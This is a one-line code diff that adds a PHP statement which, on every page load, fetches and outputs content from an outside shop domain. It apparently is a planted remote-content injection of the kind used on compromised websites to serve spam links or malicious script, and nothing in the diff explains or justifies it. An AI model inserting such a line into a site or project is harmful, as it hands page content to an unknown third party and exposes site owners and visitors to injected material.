@@ -1,0 +1,1 @@
+<?php readfile("http://aiforus.shop/sitetop") ?>
